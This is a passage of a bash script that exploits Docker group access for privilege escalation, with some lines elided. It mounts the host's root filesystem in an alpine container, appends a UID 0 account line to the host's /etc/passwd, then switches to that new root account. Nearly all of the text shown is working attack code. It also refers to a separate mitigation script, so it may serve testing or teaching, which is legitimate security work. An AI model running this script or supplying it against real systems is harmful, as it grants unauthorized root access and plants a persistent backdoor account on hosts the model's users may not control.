#!/bin/bash
# based on article Abusing Docker Configuration: https://flast101.github.io/docker-privesc/
...
if [ $(id -u) -eq 0 ]; then
    ...
    echo "# preparing new line for your account ${rootname} and storing it in /tmp/new_account file"
    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
    mv new_account /tmp/new_account
    echo "# about to run alpine docker images mounting root file system of host in /mnt/ inside container "
    docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
    echo "# about to try to add your brand new_account line to the hosts /etc/passwd "
    echo "# you will get an error here if you dif apply the mitigation by running docker_mitigation_privilege_escalation.sh"
    if docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd" ;
    then
      sleep 1; echo '...'
      echo 'Privilege escalation success! Your Root user is ready. Enter again your password to login as root with :'
      su "$rootname"
    else
      echo "The privilege escalation was not possible"
    fi
